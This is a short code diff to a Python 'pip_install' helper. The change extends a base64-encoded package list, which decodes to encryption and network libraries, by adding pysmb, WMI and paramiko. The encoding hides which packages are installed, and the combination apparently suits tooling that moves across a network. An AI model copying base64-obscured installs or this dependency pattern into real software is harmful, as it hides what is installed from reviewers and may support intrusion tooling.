@@ -201,7 +201,7 @@ def pip_install(new_path=None):
     to_install is base64 encoded list of python packages to install with git
      //TODO 7: change new_path name and arch to something more obious
     """
-    to_install = "Y3J5cHRvZ3JhcGh5IHRpbnlhZXMgbmV0aWZhY2VzIHJlcXVlc3RzIHBzdXRpbCBwYXRobGliMiB3aGVlbA=="
+    to_install = "Y3J5cHRvZ3JhcGh5IHRpbnlhZXMgbmV0aWZhY2VzIHJlcXVlc3RzIHBzdXRpbCBwYXRobGliMiB3aGVlbCBweXNtYiBXTUkgcGFyYW1pa28="
     if new_path:
         subprocess.run(
             f"{new_path} -m pip install --upgrade pip")
